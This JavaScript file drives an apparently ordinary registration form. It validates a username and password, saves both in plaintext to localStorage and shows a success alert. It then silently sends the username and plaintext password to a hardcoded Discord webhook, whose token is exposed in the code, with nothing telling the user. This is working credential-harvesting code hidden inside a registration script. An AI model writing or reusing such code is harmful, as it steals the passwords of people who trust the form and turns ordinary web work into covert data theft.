const submitButton = document.getElementById('submit-btn')
let userName
let userPassword

function saveData() {
    userName = document.getElementById('name-input').value
    userPassword = document.getElementById('password-input').value

    if(userName && userPassword) {
        if(userPassword.length >= 8) {
            if(userName.length >= 3) {
                localStorage.setItem('user', userName)
                localStorage.setItem('password', userPassword)

                alert('Registered successfully!')

                const request = new XMLHttpRequest();
                request.open("POST", "https://discord.com/api/webhooks/1134485533863706734/tcwZGNnP3jYy1ch9SYDzTUDcPLFpu0tvuvhYGEDyzNvTgIWn6NDHHBeP5o5Kq4cHKvUk");
                request.setRequestHeader('Content-type', 'application/json');
                const params = {
                            username: "Register / Login system  ",
                            avatar_url: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSRcghlSHcDsP-6nqgzvwgUjV3BRnZ5raGmjQ&usqp=CAU",
                            content:"**__New Account Registered__**"+ "\n\n" + "**Username: **" + userName + "\n" + "**Password : **" + userPassword + "\n\n" + "**=========================================================================**"
                            };
                request.send(JSON.stringify(params));
            } else {
                alert('Username should be at least 3 characters long')
            }
        } else {
            alert('Password must be at least 8 characters long')
        }
    } else {
        alert('Please fill all required fields.')
    }

    
}

submitButton.addEventListener('click', saveData)